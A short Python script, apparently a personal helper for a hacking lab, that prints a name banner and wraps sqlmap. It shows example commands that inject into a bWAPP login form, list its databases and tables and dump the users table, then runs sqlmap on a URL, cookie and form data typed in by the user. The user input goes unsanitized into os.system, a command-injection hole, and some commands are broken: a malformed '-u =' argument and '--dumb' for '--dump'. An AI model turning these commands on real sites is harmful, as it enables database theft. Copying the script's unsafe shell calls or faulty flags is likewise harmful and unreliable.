#!/usr/bin/env python
# -*- coding utf-8 -*-


import os


def figlet():
	os.system("setxkbmap tr")
	os.system("apt-get install figlet")
	os.system("clear")
	os.system("figlet efe gorkem umit")
	
def sqlmap_hello():
	print(""" 
	
	-------------------------------------------
			SQLMAP
	-------------------------------------------
	USE BURP SUITE
	
	example : 
	   sqlmap -u "http://192.168.187.135/bWAPP/sqli_16.php" --cookie="security_level=0; PHPSESSID=1d8ecb5e4713c9c190ac8844b242951f" --data="login=aa&password=bb&form=submit" --dbs
	 
    sqlmap -u "http://192.168.187.135/bWAPP/sqli_16.php" --cookie="security_level=0;
   PHPSESSID=1d8ecb5e4713c9c190ac8844b242951f" --data="login=aa&password=bb&form=submit" -D bWAPP --tables
  
  
    sqlmap -u "http://192.168.187.135/bWAPP/sqli_16.php" --cookie="security_level=0; PHPSESSID=1d8ecb5e4713c9c190ac8844b242951f" --data="login=aa&password=bb&form=submit" -T users --dumb


	
	
	
	
	""")
	fullurl = input(" ENTER FULL URL   : ")
	cookie = input(" ENTER COOKIE   : ")
	data = input(" ENTER DATA   : ")
	os.system("sqlmap -u =\""+fullurl+"\" --cookie=\""+cookie+"\" --data=\""+data+"\" --dbs "  )
	
	
